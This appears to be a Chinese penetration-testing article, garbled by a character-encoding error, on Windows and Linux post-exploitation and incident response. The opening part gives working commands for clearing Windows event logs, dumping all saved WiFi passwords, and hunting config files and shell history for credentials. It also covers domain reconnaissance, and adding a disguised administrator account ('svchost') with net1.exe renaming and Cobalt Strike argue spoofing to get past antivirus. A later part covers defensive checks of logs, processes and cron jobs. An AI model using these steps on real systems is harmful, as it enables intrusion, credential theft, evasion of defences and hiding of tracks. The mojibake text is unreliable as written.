æ—¥å¿—è·¯å¾„ï¼š ç³»ç»Ÿæ—¥å¿—ï¼š%SystemRoot%\\System32\\Winevt\\Logs\\System.evtxå®‰å…¨æ—¥å¿—ï¼š%SystemRoot%\\System32\\Winevt\\Logs\\Security.evtxåº”ç”¨ç¨‹åºæ—¥å¿—ï¼š%SystemRoot%\\System32\\Winevt\\Logs\\Application.evtxæ—¥å¿—åœ¨æ³¨å†Œè¡¨çš„é”®ï¼šHKEY_LOCAL_MACHINE\\system\\CurrentControlSet\\Services\\EventlogIISé»˜è®¤æ—¥å¿—ä½ç½®ï¼š%SystemDrive%\\inetpub\\logs\\LogFiles\\W3SVC1\\ powershellæ¸…é™¤Windowsäº‹ä»¶æ—¥å¿— PowerShell -Command &quot;&amp; {Clear-Eventlog -Log Application,System,Security}&quot;Get-WinEvent -ListLog Application,Setup,Security -Force | % {Wevtutil.exe cl $_.Logname} PSï¼šä¸Šä¼ åçš„æ–‡ä»¶å¦‚æœä¸èƒ½åˆ é™¤ï¼ˆæ²¡æƒé™æˆ–å…¶å®ƒå› ç´ ï¼‰ï¼Œé‚£ä¹ˆå¯ä»¥ä¸Šä¼ æˆ–æ–°å»ºåŒåæ–‡ä»¶ï¼Œè¦†ç›–æ‰åŸæœ‰æ–‡ä»¶ã€‚ æ•æ„Ÿæ–‡ä»¶å¯»æ‰¾ æœåŠ¡å™¨ã€ä¸­é—´ä»¶ã€æ•°æ®åº“è¿™ç±»é…ç½®æ–‡ä»¶ã€‚ è¿ç»´å¯†ç ã€å·¥ä½œè®°å½•ã€ä¸ªäººè®°å½•è¿™äº›ã€‚ å…¬å¸æ–‡ä»¶ã€åˆåŒã€ç½‘ç»œæ‹“æ‰‘å›¾è¿™ç±»ã€‚ â€¦â€¦ æœåŠ¡å™¨ã€ä¸­é—´ä»¶ã€æ•°æ®åº“è¿™ç±»é…ç½®æ–‡ä»¶çš„é‡è¦æ€§å¤§å®¶éƒ½æ‡‚ï¼Œæ¸—é€çš„æ—¶å€™å¦‚æœè·å–åˆ°ä¸€ä¸ªåŒ…å«å¤§é‡æ•æ„Ÿä¿¡æ¯çš„é…ç½®æ–‡ä»¶ï¼Œé‚£å°†ä¼šä¸ºæˆ‘ä»¬åœ¨åæ¸—é€ä½œå‡ºè‰¯å¥½çš„é“ºå«ï¼Œå¦‚ä¸‹ã€‚ æŸæ¬¡é¡¹ç›®æ—¶ï¼Œæ‹¿åˆ°ä¸€ä¸ªå­˜åœ¨å†…ç½‘çš„shellï¼Œé€šè¿‡å¯¹ä¸»æœºä¿¡æ¯æ”¶é›†ï¼Œå‘ç°æŸé…ç½®æ–‡ä»¶Config-back.xmlåŒ…å«äº†å¤§é‡çš„æ•°æ®åº“è´¦å·å¯†ç ï¼Œä¹‹åä½¿ç”¨CSä¸‹è½½è¯¥é…ç½®æ–‡ä»¶åˆ°æœ¬åœ°ï¼Œç„¶åæ­å»ºä»£ç†åˆ©ç”¨è¿™äº›è´¦å·å¯†ç æ‰¹é‡ä¸Šçº¿MSSQLä¸»æœºï¼Œå†ç»“åˆè¿™äº›å¯†ç åˆ¶ä½œå‡ºé«˜è´¨é‡å­—å…¸çˆ†ç ´Cæ®µæœºå™¨ï¼Œç”¨äº†ä¸åˆ°30åˆ†é’Ÿæ‹¿åˆ°äº†200å¤šå°æœºå™¨æƒé™ï¼Œæ‰€ä»¥è¯´æ¸—é€çš„æœ¬è´¨æ˜¯ä¿¡æ¯æœé›†ï¼Œä¿¡æ¯æœé›†çš„é‡å†³å®šç€æˆ‘ä»¬æ¸—é€çš„æˆæœï¼Œå…³äºé…ç½®æ–‡ä»¶çš„æŸ¥æ‰¾è¿™é‡Œå°±ä¸å¤šè¯´äº†ï¼Œå¯å‚è€ƒä¸Šé¢çš„dirå‘½ä»¤è¿›è¡ŒæŸ¥æ‰¾ã€‚ dir /a /s /b d:\\conf.* config.* å¦å¤–å°±æ˜¯è¦å¤šå…³æ³¨ä¸‹webç³»ç»Ÿæœ¬èº«å­˜æ”¾çš„æ–‡ä»¶ï¼Œä¹‹å‰é‡åˆ°è¿‡ä¸€ä¸ªIBMç³»ç»Ÿï¼Œé‡Œé¢æœ‰ä¸ªäº‘ç›˜åŠŸèƒ½ï¼Œä¹‹åç¿»è¿™ä¸ªåŠŸèƒ½æ¨¡å—æ‰¾åˆ°äº†ä¸ªè¿ç»´å»ºç«‹çš„æ–‡ä»¶å¤¹ï¼Œé‡Œé¢å­˜æ”¾äº†å¤§é‡çš„æ•°æ®ï¼Œä»€ä¹ˆç½‘ç»œæ‹“æ‰‘å›¾ã€è¿ç»´æ—¥å¿—ã€ç”šè‡³è¿˜æœ‰è´¦å·å¯†ç ï¼Œè¿˜æœ‰çš„å°±æ˜¯åšç­‰ä¿æ¸—é€çš„æ—¶å€™ï¼Œè¿œç¨‹åˆ°è¿ç»´æœºï¼Œæ¡Œé¢ä¸€å¤§å †è®¾å¤‡æ¸…å•ï¼Œè¿˜æœ‰å„ä¸ªç³»ç»Ÿçš„è´¦å·å¯†ç ï¼Œè€Œä¸”è¿™äº›xlsxè¡¨æ ¼éƒ½æ˜¯ä¸åŠ å¯†çš„ï¼Œç›´æ¥æ‰“å¼€å°±èƒ½æŸ¥çœ‹ï¼Œä¸€äº›è¿ç»´ä¸ºäº†è´ªå›¾æ–¹ä¾¿ï¼Œå¾€å¾€ä¼šéå¸¸ä¸¥é‡çš„å®‰å…¨éšæ‚£ï¼Œç»™äº†å…¥ä¾µè€…å¾ˆå¤§çš„æœºä¼šã€‚ è¿™é‡Œå†è¡¥å……ä¸€ä¸‹WiFiå¯†ç è·å–è¿™ä¸ªç‚¹ï¼Œåœ¨å†…ç½‘æ¸—é€ï¼Œå¯†ç è·å–åˆ°çš„è¶Šå¤šï¼Œè·¯å°±è¶Šå¥½èµ°ï¼Œå¾ˆå¤šæ—¶å€™å†…ç½‘çš„å¯†ç éƒ½æ˜¯é€šç”¨çš„ï¼Œå°±ç®—æ˜¯ä¸é€šç”¨ï¼Œå¤§éƒ¨åˆ†çš„å¯†ç ä¹Ÿæ˜¯æœ‰è§„å¾‹å¯å¾ªçš„ï¼Œå…³äºå¯†ç çš„è·å–å¯ä½¿ç”¨LaZagneã€‚ CMDè·å–WiFiå¯†ç  netsh wlan show profilesnetsh wlan show profiles name=&quot;WiFiåç§°&quot; key=clearé€šè¿‡forå¾ªç¯ä¸€æ¬¡æ€§è·å–å…¨éƒ¨WiFiå¯†ç for /f &quot;skip=9 tokens=1,2 delims=:&quot; %i in ('netsh wlan show profiles') do @echo %j | findstr -i -v echo | netsh wlan show profiles %j key=clear å¦‚æœå·²ç»å–å¾—å½“å‰æœºå™¨çš„ç®¡ç†å‘˜æƒé™çš„è¯ï¼Œå¯è¿è¡Œmimikatzã€procdumpä¹‹ç±»å‡­æ®è·å–å·¥å…·è·å–ç³»ç»Ÿå‡­æ®ï¼Œå› ä¸ºå¤šæ•°ç®¡ç†å‘˜å¯èƒ½ä½¿ç”¨åŒä¸€å¯†ç æˆ–æœ‰è§„å¾‹æ€§çš„å¯†ç æ¥ç®¡ç†å¤šå°æœåŠ¡å™¨ï¼Œå¦‚æœèƒ½å¤Ÿå¾—åˆ°ä¸»æœºå¯†ç æˆ–è€…hashå°±å¯ä»¥å°è¯•pthæˆ–psexecæ‰¹é‡ä¸Šçº¿äº†ï¼›è¿˜æœ‰å°±æ˜¯åœ¨è¿›ç¨‹æ”¶é›†çš„æ—¶å€™è¦å¤šç•™æ„ä¸€ä¸‹æ˜¯å¦æœ‰åŸŸç®¡å¯ç”¨çš„è¿›ç¨‹ï¼Œå¦‚æœåˆšå¥½åŸŸç®¡ç†å‘˜ç™»å½•è¿‡æˆ‘ä»¬å·²ç»æœ‰æƒé™çš„æœºå™¨ï¼Œé‚£ä¹ˆå°±å¯ä»¥åˆ©ç”¨åŸŸç®¡è¿›ç¨‹è¿›è¡Œæ¨ªå‘äº†ï¼Œå¦‚æœæ²¡æœ‰çš„è¯å¯å…³æ³¨ä¸‹ms14068ï¼ŒåŸŸå§”æ´¾è¿™ç±»ä¸œè¥¿ï¼Œè¿™äº›éƒ½æ˜¯åæ¸—é€åŸºæœ¬å¸¸è¯†äº†ï¼Œè¿™é‡Œä¸å¤šèµ˜è¿°ã€‚ åŸŸä¿¡æ¯æ”¶é›†å¸¸ç”¨å‘½ä»¤å¸¸ç”¨å‘½ä»¤ net use æŸ¥çœ‹ipcè¿æ¥æƒ…å†µnet user /domain è·å–åŸŸç”¨æˆ·åˆ—è¡¨net user test 123 /add æ·»åŠ ç”¨æˆ·neet localgroup administrators test /add æ·»åŠ testç”¨æˆ·åˆ°ç®¡ç†ç»„ï¼Œä¸€èˆ¬æƒ…å†µä¸‹ï¼Œç®¡ç†ç»„æ‰èƒ½è¿œç¨‹æ¡Œé¢net group /domain æŸ¥è¯¢åŸŸé‡Œé¢çš„ç»„net group &quot;domain admins&quot; /domain è·å–åŸŸç®¡ç†å‘˜åˆ—è¡¨net group &quot;enterprise admins&quot; /domain æŸ¥çœ‹å½“å‰åŸŸä¸­ä¼ä¸šç®¡ç†å‘˜ç»„ç”¨æˆ·net group &quot;domain computers&quot; /domain æŸ¥çœ‹å½“å‰åŸŸä¸­çš„æ‰€æœ‰çš„è®¡ç®—æœºåï¼ˆç™»å½•è¿‡è¯¥åŸŸçš„è®¡ç®—æœºï¼‰net group &quot;exchange servers&quot; /domain æŸ¥çœ‹åŸŸå†…æ˜¯å¦å­˜åœ¨Exchangenet group &quot;domain controllers&quot; /domain æŸ¥çœ‹åŸŸæ§åˆ¶å™¨(å¦‚æœæœ‰å¤šå°)net config workstation æŸ¥çœ‹å½“å‰ç™»å½•åŸŸnet view æŸ¥çœ‹åŒä¸€åŸŸå†…æœºå™¨åˆ—è¡¨net view \\\\ip æŸ¥çœ‹æŸIPå…±äº«net view \\\\test æŸ¥çœ‹testè®¡ç®—æœºçš„å…±äº«èµ„æºåˆ—è¡¨net view /domain æŸ¥çœ‹å†…ç½‘å­˜åœ¨å¤šå°‘ä¸ªåŸŸNet view /domain:test æŸ¥çœ‹teståŸŸä¸­çš„æœºå™¨åˆ—è¡¨wmic useraccount get Caption,sid è·å–åŸŸå†…æ‰€æœ‰ç”¨æˆ·sidsetspn -T target.com -Q */* è·å–å½“å‰åŸŸå†…æ‰€æœ‰spnfor /l %i in (1,1,255) do @ping 192.168.0.%i -w 1 -n 1 | find /i&quot;ttl&quot;for /l %i in (1,1,255) do @ping 10.10.10.%i -w 1 -n 1 | find /i&quot;ttl&quot; ç½‘ç»œä¿¡æ¯æŸ¥æ‰¾ ipconfig /all æŸ¥çœ‹å½“å‰ä¸»æœºçš„ä¸»æœºå/IP/DNSç­‰ä¿¡æ¯route print æŸ¥çœ‹è·¯ç”±è¡¨ä¿¡æ¯netstat -ano æŸ¥çœ‹å¼€æ”¾æƒ…å†µï¼Œæœ‰äº›æ—¶å€™èƒ½è·å–åˆ°åˆ«çš„IPæ®µarp -a æŸ¥çœ‹arpè§£ææƒ…å†µ å¯»æ‰¾å†…ç½‘ç½‘æ®µæ—¶å»ºè®®è¢«åŠ¨å¯»æ‰¾ï¼Œä¸»åŠ¨å¯»æ‰¾åŠ¨é™å¤ªå¤§ï¼Œå¦‚nmapã€nbtscanè¿™ç§ä¸€æ‰«ï¼Œå¯èƒ½æ•´ä¸ªç½‘æ®µå†…å­˜æ´»çš„æœºå™¨å°±å‡ºæ¥äº†ï¼Œä½†éšä¹‹è€Œæ¥çš„æ˜¯IDSçš„æµé‡å®¡è®¡ï¼Œä¸€æ—¦å¼•èµ·æµé‡å¼‚å¸¸è¢«è“é˜Ÿå¯Ÿè§‰ï¼Œå¯èƒ½å°±ä¼šå¯¼è‡´æˆ‘ä»¬æƒé™çš„ä¸¢å¤±ï¼Œæ°¸è¿œä¸è¦å°ç§è“é˜Ÿï¼Œè€Œä¸”è¿˜æ˜¯æ‹¥æœ‰å„ç§å®‰å…¨è®¾å¤‡çš„è“é˜Ÿï¼Œå†…ç½‘æ¸—é€ä¸€å®šè¦è°¨æ…ï¼Œå¤§è§„æ¨¡èµ„äº§æ‰«æï¼Œè‡ªåŠ¨åŒ–æ¼æ´æ‰«ææˆ‘ä¸€èˆ¬ä¼šç•™åˆ°æœ€åæ‰ä¸Šçš„ã€‚ å®šä½åŸŸæ§ æŸ¥çœ‹åŸŸæ—¶é—´ï¼Œä¸€èˆ¬åŸŸæ§ä¼šåšæ—¶é—´æœåŠ¡å™¨ net time /domain é€šè¿‡dnså®šä½åŸŸæ§ ipconfig /allipconfig /displaydns æœ‰äº›æ—¶å€™å¯ä»¥åœ¨dnsç¼“å­˜å¾—åˆ°åŸŸæ§ä¿¡æ¯ åˆ©ç”¨netdomè·å–åŸŸæ§åˆ—è¡¨ï¼Œå¾—åˆ°åŸŸæ§åç§°å¯é€šè¿‡pingè·å–åŸŸæ§IP netdom query dc å…¶å®ƒä¿¡æ¯æŸ¥æ‰¾ systeminfo æŸ¥çœ‹è¡¥ä¸æƒ…å†µï¼Œä¹Ÿèƒ½çœ‹åˆ°å½“å‰æœºå™¨æ˜¯å¦åŠ å…¥åŸŸç¯å¢ƒnet group &quot;domain controllers&quot; /domain æŸ¥è¯¢åŸŸæ§nslookup -type=SRV _ldap._tcp.corp é€šè¿‡srvè®°å½•è·å–åŸŸæ§åœ°å€nltest /dclist:corp ä½¿ç”¨nltestæŸ¥è¯¢åŸŸæ§åˆ—è¡¨tasklist /svc æŸ¥çœ‹è¿›ç¨‹åŠå¯¹åº”æœåŠ¡åcmdkey /l æŸ¥çœ‹å½“å‰ä¿å­˜çš„ç™»é™†å‡­è¯type c:\\Windows\\system32\\drivers\\etc\\hosts å¯ä»¥å‘ç°äº›å†…ç½‘IP å…¶å®ƒè¡¥å……webæ—¥å¿— æœ‰äº›è€ç³»ç»Ÿä¼šä½¿ç”¨get+æ˜æ–‡çš„æ–¹å¼ä¼ è¾“åå°ç™»å½•è´¦å·å¯†ç ï¼Œæˆ‘ä»¬å¯ç¿»æŸ¥ä¸‹webæ—¥å¿—ï¼Œè¯´ä¸å®šæœ‰æ”¶è·ï¼Œè¿˜æœ‰å°±æ˜¯è¦æ³¨æ„ç³»ç»Ÿæœ¬èº«çš„æ—¥å¿—ï¼Œè¿™äº›æ—¥å¿—å¤§å¤šåŒ…å«å†…ç½‘IPæ®µï¼Œç”šè‡³è¿˜æœ‰è´¦å·å¯†ç è¿™äº›ä¸œè¥¿ã€‚ ä½¿ç”¨net1.exeç»•è¿‡æ€è½¯æ·»åŠ ç”¨æˆ· windowsç¯å¢ƒæ¸—é€æ·»åŠ ç”¨æˆ·å¾€å¾€ä¼šè¢«AVæ‹¦æˆªï¼Œè€Œä¸”è¿˜ä¼šäº§ç”Ÿå‘Šè­¦æ—¥å¿—ï¼Œè¿™æ—¶å€™å¯ä½¿ç”¨net1.exeç»•è¿‡æ€è½¯æ·»åŠ ç”¨æˆ·ï¼Œå½“ç„¶ï¼Œä¹Ÿå¯ä½¿ç”¨csè‡ªå¸¦çš„argueå‚æ•°æ±¡æŸ“è¿›è¡Œç”¨æˆ·æ·»åŠ ã€‚ net1.exe cd c:/windows/system32copy net1.exe svchost.txtsvchost.txt user svchost M@Bas#as#@123 /addnet localgroup administrators svchost /addsvchost.txt user svchost M@Bas#as#@123 /add &amp; net localgroup administrators svchost /add argueå‚æ•°æ±¡æŸ“ net1 argue net1 aaaaaaaaaaaaaaaaaaaaaaaassssssssssssssssssssssssssssssssssssssssssssssssssexecute net1 user svchost M@Bas#as#@123 /addexecute net1 localgroup administrators svchost /add æ­£å¸¸ä½¿ç”¨netæ·»åŠ ç”¨æˆ·ä¼šè¢«ç«ç»’æ‹¦æˆª æ·»åŠ ç”¨æˆ·å¹¶åŠ åˆ°ç®¡ç†å‘˜ç»„ m1kh.txt user m1kh M@Bas#as#@123 /add &amp; net localgroup administrators m1kh /add linuxä¸»æœºä¿¡æ¯æ”¶é›†ç½‘ç»œä¿¡æ¯æ”¶é›†last å¤šæ•°è¿ç»´ä¼šæ¥å…¥å†…ç½‘ç™»å½•ç³»ç»Ÿï¼Œè¿™æ—¶å€™ï¼Œä¾¿å¯è·å–éƒ¨åˆ†å†…ç½‘ip è¿›è€Œå¯¹å†…ç½‘IPæ®µè¿›è¡Œç”»åƒIfconfig -a/arp -a/netstat -anopt/ss -nt è¿™äº›å°±ä¸å¤šè¯´äº†Route -n å†…ç½‘è·¯ç”±æƒ…å†µï¼Œä¹Ÿèƒ½ä¸ºå†…ç½‘ç½‘ç»œæ‹“æ‰‘æä¾›ä¸€å®šçš„ä¿¡æ¯IPtables é˜²ç«å¢™æƒ…å†µï¼Œæœ‰æ—¶å€™ä¼šå­˜åœ¨å†…ç½‘ç½‘ç»œé€šè¡Œè§„åˆ™ï¼Œä¹Ÿèƒ½æä¾›ä¸€å®šä¿¡æ¯.... æ•æ„Ÿæ–‡ä»¶æ”¶é›†grep &quot;password:&quot; * -Rnfind / -name &quot;config.*&quot;find / -name &quot;databases.*&quot;find / -name &quot;config.*&quot; | xargs grep &quot;password&quot;&quot; å…¶ä»–è¡¥å……historyå‘½ä»¤history åœ¨linuxæ¸—é€æ—¶æ˜¯éå¸¸å®ç”¨çš„ï¼Œå„ç§è¿æ¥å¯†ç ï¼Œsshã€mysqlã€ftpç­‰ç­‰ï¼Œåœ¨æ‹¿åˆ°æƒé™æ˜¯åº”è¯¥ç€é‡çœ‹çœ‹è¿™ä¸ªæ–‡ä»¶ æ—¥å¿—ç›¸å…³å‘½ä»¤lastå‘½ä»¤è®°å½•ç€æ‰€æœ‰ç”¨æˆ·ç™»å½•ç³»ç»Ÿçš„æ—¥å¿—ï¼Œå¯ä»¥ç”¨æ¥æŸ¥æ‰¾éæˆæƒç”¨æˆ·çš„ç™»å½•äº‹ä»¶ï¼Œè€Œlastå‘½ä»¤çš„è¾“å‡ºç»“æœæ¥æºäº/var/log/wtmpæ–‡ä»¶ï¼Œç¨æœ‰ç»éªŒçš„å…¥ä¾µè€…éƒ½ä¼šåˆ æ‰/var/log/wtmpä»¥æ¸…é™¤è‡ªå·±è¡Œè¸ªï¼Œä½†æ˜¯è¿˜æ˜¯ä¼šéœ²å‡ºè››ä¸é©¬è¿¹åœ¨æ­¤æ–‡ä»¶ä¸­çš„ã€‚ å¯ç”¨ä»¥ä¸‹å‘½ä»¤åˆ†æç”¨æˆ·ç™»å½•è¡Œä¸º who æŸ¥çœ‹å½“å‰ç™»å½•ç”¨æˆ·ï¼ˆttyæœ¬åœ°ç™»é™† ptsè¿œç¨‹ç™»å½•ï¼‰w æŸ¥çœ‹æŸä¸€æ—¶åˆ»ç”¨æˆ·çš„è¡Œä¸ºuptime æŸ¥çœ‹æœ‰å¤šå°‘ç”¨æˆ·ï¼Œä»¥æ­¤ç¡®å®šæ˜¯å¦å­˜åœ¨å¼‚å¸¸ç”¨æˆ·lastb æ˜¾ç¤ºç™»å½•å¤±è´¥æ¬¡æ•°ï¼Œåˆ¤æ–­æ˜¯å­˜åœ¨sshçˆ†ç ´last æ˜¾ç¤ºç”¨æˆ·æœ€è¿‘ç™»å½•ä¿¡æ¯ã€‚lastlog ç™»å½•æˆåŠŸè®°å½• è¿›ç¨‹å’Œç«¯å£æ£€æŸ¥è¿›ç¨‹æ£€æŸ¥ ç”¨pså‘½ä»¤æŸ¥çœ‹æœåŠ¡å™¨ä¸Šçš„æ‰€æœ‰è¿›ç¨‹ï¼Œå®šä½æ¶æ„è¿›ç¨‹ã€‚ ps -a åˆ—å‡ºçš„æ˜¯å½“å‰æ§åˆ¶ç»ˆç«¯å¯åŠ¨çš„è¿›ç¨‹ps -A ç³»ç»Ÿå…¨éƒ¨å¯åŠ¨è¿›ç¨‹ps auxf æŸ¥çœ‹çˆ¶è¿›ç¨‹å…³è”çš„å­è¿›ç¨‹pstree æŸ¥çœ‹è¿›ç¨‹æ ‘ è¿›ç¨‹è¿‡å¤šçš„è¯ä¹Ÿå¯ä»¥ç”¨å‘½ä»¤ï¼šps -aux | grep è¿›ç¨‹å å®šä½åˆ°æ¶æ„ç¨‹åº ps -aux | grep è¿›ç¨‹å procè¿™é‡Œç®€è¦è¯´ä¸€ä¸‹procï¼š /proc æ˜¯ä¸€ä¸ªä¼ªæ–‡ä»¶ç³»ç»Ÿï¼Œè¿™ä¸ªä¼ªæ–‡ä»¶ç³»ç»Ÿè®©ä½ å¯ä»¥å’Œå†…æ ¸å†…éƒ¨æ•°æ®ç»“æ„è¿›è¡Œäº¤äº’ï¼Œä¸çœŸæ­£çš„æ–‡ä»¶ç³»ç»Ÿä¸åŒçš„æ˜¯å®ƒæ˜¯å­˜åœ¨äºå†…å­˜ä¸­è€Œä¸æ˜¯çœŸæ­£çš„ç¡¬ç›˜ä¸Šï¼Œæ‰€ä»¥é‡å¯å/procä¼šè¢«é‡ç½®æ‰ï¼Œlinux ä¸‹æœ‰ä¸€ä¸ªè¯´æ³•å³ä¸€åˆ‡çš†æ–‡ä»¶ï¼Œæ‰€æœ‰åœ¨linuxä¸Šè¿è¡Œçš„ç¨‹åºéƒ½åœ¨/procä¸‹æœ‰ä¸€ä¸ªè‡ªå·±çš„ç›®å½•ï¼Œç›®å½•åå­—ä¸ºç¨‹åºçš„Pidå·ï¼Œç›®å½•é‡Œé¢å­˜å‚¨ç€è®¸å¤šå…³äºè¿›ç¨‹çš„ä¿¡æ¯ï¼Œåˆ—å¦‚è¿›ç¨‹çŠ¶æ€statusï¼Œè¿›ç¨‹å¯åŠ¨æ—¶çš„ç›¸å…³å‘½ä»¤cmdlineï¼Œè¿›ç¨‹çš„å†…å­˜æ˜ åƒmapsï¼Œè¿›ç¨‹åŒ…å«çš„æ‰€æœ‰ç›¸å…³çš„æ–‡ä»¶æè¿°ç¬¦fdæ–‡ä»¶å¤¹ç­‰ç­‰å…¶ä¸­ /proc/pid/fd ä¸­åŒ…å«ç€è¿›ç¨‹æ‰“å¼€çš„æ‰€æœ‰æ–‡ä»¶çš„æ–‡ä»¶æè¿°ç¬¦ï¼Œè¿™äº›æ–‡ä»¶æè¿°ç¬¦çœ‹èµ·æ¥åƒé“¾æ¥æ–‡ä»¶ä¸€æ ·ï¼Œé€šè¿‡ls -l ä½ å¯ä»¥çœ‹è§è¿™äº›æ–‡ä»¶çš„å…·ä½“ä½ç½®ï¼Œä½†æ˜¯å®ƒä»¬å¹¶ä¸æ˜¯ç®€å•è¿æ¥æ–‡ä»¶ï¼Œä½ å¯ä»¥é€šè¿‡è¿™äº›æ–‡ä»¶æè¿°ç¬¦å†æ‰“å¼€è¿™äº›æ–‡ä»¶ï¼Œä½ å¯ä»¥é‡æ–°è·å¾—ä¸€ä¸ªæ–°çš„æ–‡ä»¶æè¿°ç¬¦ï¼Œå³ä½¿è¿™äº›æ–‡ä»¶åœ¨ä½ æ‰€åœ¨çš„ä½ç½®æ˜¯ä¸èƒ½è®¿é—®ï¼Œä½ ä¾ç„¶å¯ä»¥æ‰“å¼€ã€‚ è¿˜ä¸€ä¸ª /proc/pid/exe æ–‡ä»¶ï¼Œè¿™ä¸ªæ–‡ä»¶æŒ‡å‘è¿›ç¨‹æœ¬èº«çš„å¯æ‰§è¡Œæ–‡ä»¶ã€‚ æ‰€ä»¥åœ¨å¾—åˆ°PIDåï¼Œæˆ‘ä»¬å°±èƒ½åˆ©ç”¨ä»¥ä¸‹å‘½ä»¤è·å–è¯¥PIDæ‰€å¯¹åº”çš„è¿›ç¨‹æ–‡ä»¶è·¯å¾„ï¼Œè·å–è¿›ç¨‹çš„è¯¦ç»†ä¿¡æ¯äº†ï¼š ls -l /proc/$PID/exefile /proc/$PID/exeï¼ˆ$PID ä¸ºå¯¹åº”çš„pid å·ï¼‰which name æŸ¥çœ‹ç¨‹åºåœ¨å“ªä¸ªæ–‡ä»¶å¤¹ nameè¡¨ç¤ºç¨‹åºålsof /usr/bin/* æŸ¥çœ‹æŸä¸ªè·¯å¾„ä¸‹çš„è¿è¡Œä¸­çš„è¿›ç¨‹åˆ—è¡¨pidof /usr/bin/* historyä¿¡æ¯æ£€æŸ¥æ”»å‡»è€…å…¥ä¾µåï¼Œå¾€å¾€ä¼šé¡ºæ‰‹æŠŠå†å²æ“ä½œå‘½ä»¤ç»™æ¸…é™¤æ‰ï¼ˆhistory -cï¼‰ï¼Œä½†æ­¤å‘½ä»¤å¹¶ä¸ä¼šæ¸…é™¤ä¿å­˜åœ¨æ–‡ä»¶ä¸­çš„è®°å½•ï¼Œå› æ­¤æ‰“å¼€/homeå„å¸å·ç›®å½•ä¸‹çš„.bash_historyï¼ŒæŸ¥çœ‹æ¯ä¸ªç”¨æˆ·ç›®å½•ä¸‹çš„.bash_historyæ–‡ä»¶ï¼Œç‰¹åˆ«æ˜¯/rootç›®å½•ä¸‹çš„.bash_historyæ–‡ä»¶ï¼Œæ­¤æ–‡ä»¶ä¸­è®°å½•ç€ç”¨æˆ·æ‰§è¡Œçš„æ‰€æœ‰å†å²å‘½ä»¤ï¼Œå¾ˆå¤šæ—¶å€™æ”»å‡»è€…ä¼šé€šè¿‡wgetä¸‹è½½æ¶æ„æœ¨é©¬åˆ°æœåŠ¡å™¨ï¼Œè¿™æ—¶å€™æŸ¥çœ‹historyè¯´ä¸å®šå°±èƒ½æ•è·æ”»å‡»è€…çš„C2æœåŠ¡å™¨äº†ã€‚ historycat /root/.bash_history &gt; root_history.txthistory -w historyä¼˜åŒ– cat /etc/ssh/sshd_config å†å²çš„å‘½ä»¤å¢åŠ ç™»å½•çš„IPåœ°å€ã€æ‰§è¡Œå‘½ä»¤æ—¶é—´ç­‰ä¿¡æ¯ï¼š1. ä¿å­˜1ä¸‡æ¡å‘½ä»¤sed -i 's/^HISTSIZE=1000/HISTSIZE=10000/g' /etc/profile2. åœ¨/etc/profileçš„æ–‡ä»¶å°¾éƒ¨æ·»åŠ å¦‚ä¸‹è¡Œæ•°é…ç½®ä¿¡æ¯ï¼š##historyä¼˜åŒ–USER_IP=`who -u am i 2&gt;/dev/null | awk '{print $NF}' | sed -e 's/[()]//g'`if [ &quot;$USER_IP&quot; = &quot;&quot; ]thenUSER_IP=`hostname`fiexport HISTTIMEFORMAT=&quot;%F %T $USER_IP `whoami` &quot;shopt -s histappendexport PROMPT_COMMAND=&quot;history -a&quot;3. source /etc/profileè®©é…ç½®ç”Ÿæ•ˆç”Ÿæˆæ•ˆæœï¼š 329 2021-04-14 16:39:43 183.6.56.66 root cat /etc/profile ä¸»æœºæœåŠ¡åˆ†ææšä¸¾ä¸»æœºæ‰€æœ‰æœåŠ¡ï¼ŒæŸ¥çœ‹æ˜¯å¦æœ‰æ¶æ„æœåŠ¡ã€‚ service --status-allchkconfig â€“list #åˆ—å‡ºæ‰€æœ‰çš„ç³»ç»ŸæœåŠ¡ å®šæ—¶ä»»åŠ¡åˆ†æå®šæ—¶ä»»åŠ¡å¯¹äºç©CTFå’Œåšæ¸—é€çš„å¸ˆå‚…åº”è¯¥éƒ½ä¸é™Œç”Ÿ æŸ¥çœ‹å•ä¸ªç”¨æˆ·çš„å®šæ—¶ä»»åŠ¡ crontab -l å¾ªç¯éå†æ‰€æœ‰ç”¨æˆ·çš„å®šæ—¶ä»»åŠ¡ for u in `cat /etc/passwd | cut -d&quot;:&quot; -f1`;do crontab -l -u $u;done anacronå¼‚æ­¥å®šæ—¶ä»»åŠ¡æŸ¥çœ‹ cat /etc/anacrontab é™¤æ­¤ä¹‹å¤–ï¼Œä»¥ä¸‹ç›®å½•ä¸­ä¹Ÿå¯èƒ½å­˜åœ¨æ¶æ„è„šæœ¬ï¼Œéœ€è¿›ä¸€æ­¥æ’æŸ¥ã€‚ /var/spool/cron/* /etc/crontab/etc/cron.d/*/etc/cron.daily/* /etc/cron.hourly/* /etc/cron.monthly/*/etc/cron.weekly//etc/anacrontab/var/spool/anacron/* æŸ¥çœ‹CPUè¿è¡Œå®šä½æŒ–çŸ¿æ—¶å¾ˆå®ç”¨ top sshç§˜é’¥åˆ†æredisæœªæˆæƒè®¿é—®æ¼æ´å¯ç›´æ¥å‘æœåŠ¡å™¨å†™å…¥å…¬é’¥ï¼Œä»è€Œå®ç°æ— å¯†ç ç™»å½•æœåŠ¡å™¨ï¼Œä¹‹å‰ä¹Ÿå†™è¿‡ç±»ä¼¼çš„æ–‡ç« ï¼Œæ‰€ä»¥è¦é‡ç‚¹å…³æ³¨/etc/.sshã€ ~/.ssh ç›®å½•ä¸‹æœ‰æ— å¯ç–‘å…¬é’¥ ll -al /etc/ssh/ll -al /root/.ssh/ æ—¥å¿—åˆ†ææŸ¥çœ‹æ—¥å¿—æ˜¯æŸ¥æ‰¾æ”»å‡»æºæœ€å¥½çš„æ–¹æ³•ï¼Œè™½ç„¶è€—æ—¶é•¿ï¼›linuxæ—¥å¿—é»˜è®¤å­˜æ”¾ä½ç½®ï¼š/var/log/ æŸ¥çœ‹æ—¥å¿—é…ç½®æƒ…å†µï¼šmore /etc/rsyslog.conf æ—¥å¿—æ–‡ä»¶ è¯´æ˜ /var/log/cron è®°å½•äº†ç³»ç»Ÿå®šæ—¶ä»»åŠ¡ç›¸å…³çš„æ—¥å¿— /var/log/cups è®°å½•æ‰“å°ä¿¡æ¯çš„æ—¥å¿— /var/log/dmesg è®°å½•äº†ç³»ç»Ÿåœ¨å¼€æœºæ—¶å†…æ ¸è‡ªæ£€çš„ä¿¡æ¯ï¼Œä¹Ÿå¯ä»¥ä½¿ç”¨dmesgå‘½ä»¤ç›´æ¥æŸ¥çœ‹å†…æ ¸è‡ªæ£€ä¿¡æ¯ /var/log/mailog è®°å½•é‚®ä»¶ä¿¡æ¯ /var/log/message 